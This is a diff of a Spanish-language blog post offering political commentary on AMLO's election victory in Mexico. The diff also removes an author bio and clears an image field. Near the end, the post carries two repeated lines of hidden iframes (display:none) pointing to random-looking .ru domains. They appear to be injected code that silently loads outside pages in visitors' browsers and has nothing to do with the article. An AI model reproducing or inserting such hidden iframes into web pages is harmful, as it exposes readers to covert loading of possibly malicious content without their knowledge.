@@ -3,7 +3,7 @@ title: "La victoria en México"
 date: "2018-12-05T15:08:58+00:00"
 author: "Miguel Alejandro Hayes Martínez"
 category: "Política"
-image: "/wp-content/uploads/2018/07/AMLO.png"
+image: ""
 ---
 Todavía recuerdo esa elección donde **AMLO** perdió oscuramente contra Felipe Calderón. Tras tantos años, en un momento donde la izquierda regional va perdiendo espacios de poder frente a derechas, **una nueva esperanza -cargada de especulación y sensacionalismo- rodea la futura gestión del recién electo presidente.**  
 Después de intentar no contaminarme con la avalancha de escritos sobre el tema, me pregunto hasta qué punto toda esa aura que ahora lo rodeo, no será más de lo mismo, de ese espectáculo que se montan los medios alrededor de los políticos. Presiento que esta historia ya yo- y muchos más-la hemos vivido.
@@ -28,15 +28,3 @@ De todos modos, si ese gobierno lograra subvertir ese estado de las cosas tan co
 <iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
 
 <iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-## Autor
-
--   ![](/avatar/e5d4ac9a023b2fcc57340a4d5963fd53?s=80&r=g&d=mm)
-    
-    ![](//www.gravatar.com/avatar/e5d4ac9a023b2fcc57340a4d5963fd53?s=80&r=g&d=mm)
-    
-    [Miguel Alejandro Hayes](https://web.archive.org/web/20221204123508/https://www.trincheracuba.com/author/hayesmartinez/)
-    
-    Editor principal de La Trinchera. Escribo por inspiración
-    
-    [](mailto:hayesmartinez.mrgh@gmail.com)
